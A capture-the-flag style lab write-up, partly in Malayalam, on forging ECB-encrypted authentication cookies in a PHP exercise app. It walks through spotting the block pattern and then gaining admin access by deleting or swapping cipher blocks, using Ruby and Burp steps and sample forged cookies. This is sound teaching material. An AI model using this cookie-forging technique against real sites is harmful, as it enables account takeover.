## Introduction
-->This exercise explains how you can tamper with an encrypted cookies to access another user's account.
-->This course details the exploitation of a weakness in the authentication of a PHP website. The website uses ECB to encrypt information provided by users and use this information to ensure authentication. We will see how this behaviour can impact the authentication and how it can be exploited.
-->If you feel confident, you can try to do this exercise without following the course, then you can come back to the course to read some details and tips. If you want to do it by yourself, you can follow the following steps :
-   create 2 users with similar names: `test1` and `test2` and the same password `password`, then look at the cookie sent back by the application.
-   create a user with a really long name composed of the same character (like 20 times `a`) and look at the cookie sent back by the application. Try to look for a pattern that will give you more information on how the information can be manipulated.
-   try to create a user with a username and password that will allow you to be logged in as `admin` by removing encrypted data.
-   try to create a user with a username that will allow you to be logged in as `admin` by swapping encrypted blocks around.

## ECB
-->ECB is an encryption mode in which the message is split into blocks of X bytes length and each block is encrypted separately using a key.
-->The following schema (source: [Wikipedia](http://en.wikipedia.org/wiki/Block_cipher_mode_of_operation)) explains this method
-->You can check the [recent XKCD on the Adobe's password leak](http://xkcd.com/1286/) to get an humoristic idea of the problems tied to ECB.
-->During the decryption, the reverse operation is used. Using ECB has multiple security implications:
-   Blocks from encrypted message can be removed without disturbing the decryption process.
-   Blocks from encrypted message can be moved around without disturbing the decryption process.
-->In this exercise, we will see how we can exploit these two weaknesses.

## Detection of the vulnerability
-->In this exercise, you can register an account and log in with this account (to make things easier, you get automatically logged in when you register).
-->If you create an account and log in two times with this account, you can see that the cookie sent by the application didn't change.
-->If you log in many times and always get the same cookie, there is probably something wrong in the application. The cookie sent back should be unique each time you log in. If the cookie is always the same, it will probably always be valid and there won't be anyway to invalidate it.
-->If we look at the cookie, we can see that it seems uri-encoded and base64-encoded
-->The 2 equals sign encoded as `%3d%3d` are a good indicator of base64-encoded string.
-->We can decode it using the following ruby code:
```ruby
% irb
	> require 'base64' ; require 'uri'
	 => true
	> Base64.decode64(URI.decode("OR9hcp18%2BC1bChK10NlRRg%3d%3d"))
	 => "9\x1Far\x9D|\xF8-[\n\x12\xB5\xD0\xD9QF"
```
-->Or by decoding the URI to a string manually and use the base64 command:
```
% echo "OR9hcp18+C1bChK10NlRRg==" | base64 -D | hexdump -C
0000000 39 1f 61 72 9d 7c f8 2d 5b 0a 12 b5 d0 d9 51 46  |9.ar.|.-[.....QF|
0000010
```
-->In both cases, we can see that the information seems to be encrypted.

-->First, we can start by creating two accounts `test1` and `test2` with the same password: `password` and compare the cookies sent by the application
-->We can see that part of the decrypted values look really similar.
-->Now we can try to create a user with an arbitrary long username and password. For example, a username composed of 20 `a` and a password composed of 20 `a`. By creating this user, we get the following cookie:
```
	> document.cookie
	"auth=GkzSM2vKHdcaTNIza8od1wS28inRHiC2GkzSM2vKHdcaTNIza8od1ys96EXmirn5"
```
-->If we decode this value, we get the following value:
```
\x1AL\xD23k\xCA\x1D\xD7\x1AL\xD23k\xCA\x1D\xD7\x04\xB6\xF2)\xD1\x1E \xB6\x1AL\xD23k\xCA\x1D\xD7\x1AL\xD23k\xCA\x1D\xD7+=\xE8E\xE6\x8A\xB9\xF9
```
-->We can see that the following pattern (composed of 8 bytes): **`\x1AL\xD23k\xCA\x1D\xD7`** comes back multiple times:
```
\x1AL\xD23k\xCA\x1D\xD7\x1AL\xD23k\xCA\x1D\xD7\x04\xB6\xF2)\xD1\x1E \xB6\x1AL\xD23k\xCA\x1D\xD7\x1AL\xD23k\xCA\x1D\xD7+=\xE8E\xE6\x8A\xB9\xF9
```
-->Based on the size of the pattern, we can infer that the ECB encryption uses a block size of 8 bytes.
-->This example is using a weak encryption mechanism and it's likely that real life examples will use bigger block size.
-->The decoded information also shows us that the username and password are not directly concatenated and that a delimiter is added (since one of the block in the middle is different from the previous one).
-->We can think of the encrypted stream has one of the two following possibilities:
-   The stream contains the username, a delimiter and the password
-  The stream contains the password, a delimiter and the username
-->By creating another user with a long username and a short password, we can see that the following pattern is used: `username|delimiter|password`.
-->Now let's try to find the size of the delimiter, if we play with different size of username and password :
-->We can see that the size of the decoded cookie goes from 8 to 16 bytes when the length of the Username+Password is greater than 7. We can infer from this value that the delimiter is a single byte since the encryption is done per block of 8 bytes.
-->Another important thing is to see what part of the encrypted stream is used by the application when we send the cookie back. If we remove everything after the block corresponding to the delimiter, we can see that we are still authenticated. The password does not seem to be used when the cookie gets used by the application.
-->We now know that we just need to get the correct `username|delimiter` to get authenticated within the application as `username`.

# Exploitation of the vulnerability
## By removing information
-->The easiest way to get `admin` access is to remove some of the encrypted data. We know that the application uses the following format:
```less
\[username\]:\[separator\]
```
-->and only uses the `username` when the cookie is sent back to the application. We also know that each block of 8 bytes is completely independent (ECB). To exploit this issue, we can create a username that contains 8 characters followed by the word `admin`:
```
aaaaaaaaadmin
```
-->And we will receive the cookie (retrieved using the Javascript Console):
```
	> document.cookie
	"auth=GkzSM2vKHdfgVmQuKXLregdPxmQZ4yvj"
```
-->This value will get decoded as:
```
\x1AL\xD23k\xCA\x1D\xD7\xE0Vd.)r\xEBz\aO\xC6d\x19\xE3+\xE3
```
-->We can see the pattern `\x1AL\xD23k\xCA\x1D\xD7` detected previously with the username that contained 20 `a`.
-->We can then remove the first 8 bytes of information and reencode our payload to get a new cookie:
```
\xE0Vd.)r\xEBz\aO\xC6d\x19\xE3+\xE3
```
-->That will get encoded by the following ruby code:
```ruby
% irb
> require 'cgi'; require 'base64'
  => true
> CGI.escape(Base64.strict_encode64("\xE0Vd.)r\xEBz\aO\xC6d\x19\xE3+\xE3"))
  => "4FZkLily63oHT8ZkGeMr4w%3D%3D"
```
-->Once you modify the cookie And send this value back to the application (by reloading the page), you get logged in as `admin`

## By swapping blocks around (another way)
-->A more complicated way to bypass this is to swap data around. We can make the assumption that the application will use an SQL query to retrieve information from the user based on his `username`. For some databases, when using the type of data `VARCHAR` (as opposed to `BINARY` for example), the following will give the same result:
```sql
SELECT * FROM users WHERE username='admin';
```
```sql
SELECT * FROM users WHERE username='admin        ';
```
-->The spaces after the value `admin` are ignored during the string comparison. We will use this to play with the encrypted blocks.
-->Our goal is to end up with the following encrypted data:
```scss
ECB(admin   [separator]password)
```
-->We know that our separator is only composed of one byte. We can use this information to create the perfect `username` and `password` to be able to swap the blocks and get the correct forged value.
-->We need to find a username and a password for which:
-   the password starts with `admin` to be used as the new username.
-   the encrypted password should be located at the start of a new block.
-   the `username+delimiter` length should be divisible by the block size (from previous conditions)
-->By playing around, we can see that the following values work:
-   a `username` composed of `password` (8 bytes) followed by 7 spaces (1 byte will be used by the delimiter).
-   a `password` composed of `admin` followed by 3 spaces (`8 - length("admin")`).
-->NOTE : When creating this user, use a proxy to intercept the request and make sure your browser didn't remove the space characters.

## Conclusion
-->This exercise showed you how you can tamper encrypted information without decrypting them and use this behaviour to gain access to other accounts. It showed you that encryption can not be used as a replacement to signature and how it's possible to use ECB encryption to get control on the decrypted information.

# Video explanation
## Vidoe 1 - Introduction
-->When encrypting data multiple modes can be used ie, Electronic Codebook(ECB), Cipher Block Chaining(CBC), Output Feedback(OFB) and Counter(CTR) mode encryption etc...
-->ECB yil oro datayum independent aayitan add chyunath.so namal aa block il ninum oru block remove chythalum onum sambavikila ennan parayunath.karanam oronum independent aan polum.athayath matu mode of encryptions oke pinem connected aan oro blocksum liek CBC,OFB,CTR oke.but ECB yil oro block um matu blockumaryi oru connection um illa.athayath oru block encrypt chyuna samayath aa oru block mathramayan encrypt chyunath.apol mattu block encrypt chyuna samayath athin mumb encrypt chytha blockumayi oru connection um illa.njan paryaunath oru otta plaintext encrytp chyuna karyaman.athayath oru passwrod encrypt chyumbol athile oro bytes um independent aayan encrypt chyunath.so athukond thane oru byte remove chyumbol ath aa password il ulla mattu bytes ine bhadikunila.athukond thane tampering nadano enn ariyan patila.athukond thane namuk vendatha block remove chythalum ath aa complete cipher text ine bhadikila
```
 cipher textn                                  cipher text                                
        ^                                            ^
key ->block cipher encryption            key ->block cipher encryption
       ^                                             ^
   plain text                                    plain text
```
-->ithinte image nokam apo correct manasilakum
![License](https://assets.pentesterlab.com/ecb/ECB_encryption.png)
-->ivde plain text engane aan ECB yil cipher text aaki encrypt chyunath ennan kanikunath. plain text cipher text aakumbol oru key vech encrypt chyunu
-->but ivide sredhikuka- rand blocks encrypt chyunathan kanikunath.but ivide ee rand data yum independent aayan encruption nadakunath.rand block um angotum ingotum connection illa.athan njan parnjath aadyathe block remove chythalum tampering nadano enn ECB kk ariyan patila

## The Application
-->when you login the application issue a cookie :
- This cookie contains your username and passwd encrypted using ECB mode
- The encrypted data is base64 encoded
-->when you visit the application with a cookie :
- The application decoded your cookie
- The application decrypts your cookie
- The application uses your username

## The Vulnerability
-->The application uses encryption where it should be using signature :
- Encryption provides confidentiality
- Signature privides Integirity
-->what the application needs is integirity to ensure that an attacker didnt tamper with the data inside the cookie
-->==ECB mode allows an attacker to easily manipulate the encrypted data without decrypting it==

## Video 2 - Exploitation
-->lab open chyuka enit enthenglum credential koduth account undakuka enit burp ile requst il nokiyal kanam namal accoutn undakiya requst inte response il namuk oru cookie kittund
```
Set-Cookie: auth=eLZjSPITdgI%3D
```
-->so ith eduth decoder il itt url->base64 decode chyuka apol namuk prathyekich onum kitula karanam ith encrypted aan.but athile hex values nokiyal kanam ith oru 8 bytes block aan. ECB yum 8 bytes block aan use chyunath
-->ini namuke username um password um valiya stirng aayitulla oru account undakam liek username: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa & passwd: bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
-->ingane itt account undakit namal namuk kitiya session cookie nokumbol :
```
Set-Cookie: auth=9KG7Vr4LWlr0obtWvgtaWvShu1a%2BC1pa9KG7Vr4LWlr0obtWvgtaWvShu1a%2BC1pa2cie%2FDG11CXjxTyjn3MXOePFPKOfcxc548U8o59zFznjxTyjn3MXOePFPKOfcxc548U8o59zFznjxTyjn3MXOb0GnDRGPbNI
```
enn kanunu ie, usernmae and passwd in anusarich cookie lenth koodunund
-->ini ith eduth decoder il itt base64 decode chyumbol namuk hex inte avide kanam 8 bytes aan.but namal username ellam a aanalo koduthath so bytes oke similar aayi kidakunud ie,
```
	f4	a1	bb	56	be	0b	5a 5a	 f4	a1	bb	56	be	0b	5a	5a
	f4	a1	75	31	61	25	d8 10	 b5	a5	af	4a	1b	b5	6b	e0	
	b5	a5	af	4a	1b	b5	6b e0	 b5	a5	af	4a	1b	b5	61	25	
	d8	10	b5	a5	ad	9c	69 65	 25	d8	50	c6	d7	50	97	8f	
	14	f2	8e	7d	cc	5c	e7 8f	 14	f2	8e	7d	cc	5c	e7	8f	
	14	f2	8e	7d	cc	5c	e7 8f	 14	f2	8e	7d	cc	5c	e7	8f	
	14	f2	8e	7d	cc	5c	e7 8f	 14	f2	8e	7d	cc	5c	e7	8f	
	14	f2	8e	7d	cc	5c	e6 f4	 1a	70	d1	18	f6	cd	49	--
```
-->ivide oro block ilum 8 bytes kanam.ee oro block ilem 8 bytes nokiyal kanam similarities und
-->so namuk ini ithil eth part aan username and passwd enn kandupidikanam
-->ivide 8 bytes aan add akunath enn namuk manasilayi.so ini namuk puthiya oru account undakam athin 16 a varuna reethiyi username kodukuka ie, username:aaaaaaaaaaaaaaaa & passwd:bbb
-->so ingane chyth account undaki namal request nokumbol namuk puthiya cookie kitum ->`9KG7Vr4LWlr0obtWvgtaWlrABKq5v9Cz`
-->so ith eduth decoder il itt base64 decode chyumbol :
```
f4	a1	bb	56	be	0b	5a 5a	 f4	a1	bb	56	be	0b	5a	5a	
5a	c0	04	aa	b9	bf	d0 b3	 --	--	--	--	--	--	--	--
```
-->ingane kitum.namal 16 bytes of username aan koduthal.ivide aadyathe line nokiyal akanm 16 bytes und athum in a similar pattern.so athan namuder username
-->so cookieyil aadyam kanunath namude username aan
-->ini randamathe line il kanuna 8 bytes nok. ath probably seperator(ie, ':' athyath username:passwd ingane aanalo undavuk.ivide colon aan serperator) um pine namude moon bbb passwdum aan.athinte koode passwd in shesham some padding undayekam.so athoke aan randamathe line il kanuna 8 bytes
-->ini ee kitiya information vech namuk admin aayi impersonate chyan nokam
-->so logout chyth puthiya account undakanam username il 8 a yum pine admin enum kodukananm ie, `username:aaaaaaaaadmin&password:test`  ingane koduth account undakuka enit namude reqeust il poi namuk kitiya cookie eduth decoder il itt base64 il decode chyuka :
```
f4	a1	bb	56	be	0b	5a 5a	 a3	06	43	f6	c5	bc	24	6a	
1b	d1	24	52	e8	11	01 b9	 --	--	--	--	--	--	--	--
```
ini ithil adyathe line il kanuna aadyateh 8 bytes ennath namal username il koduthal aadyathe 8 a aan(8 a enn thane kodukanamenil enthengilum 8 letterskoduthamathi). athin sehsham kanuna 8 bytes aan "admin"
-->so namuk ithile aadyathe 8 byres remove chyam :
```
a3	06	43	f6	c5	bc	24 6a	 1b	d1	24	52	e8	11	01	b9
```
-->ipol namal kanunath admin:bbb enna format aan.so ivide ipol aadyam kidakunath admin aan.
-->so ith ini base64 il encode chyanam ->`owZD9sW8JGob0SRS6BEBuQ==`
-->ipol ithinte base64 kiti.ini ee request ile /index.php enna request eduth repeater il iduka enit athile cookie mati ee base64 encoded cookie eduth paste chyth send cadikumbol namuk admin page access chyan patunund.aa page il lab solve chyan ulla key tharunund ok.
-->so ingane lab solve chyam ok